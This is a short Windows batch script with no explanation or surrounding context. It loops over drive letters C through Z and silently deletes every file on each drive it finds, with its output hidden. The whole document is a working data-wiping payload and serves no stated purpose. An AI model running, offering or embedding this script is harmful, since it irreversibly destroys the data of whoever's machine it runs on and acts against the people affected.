@echo off
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        del /q /s %%d:\*.* >nul 2>&1
    )
)
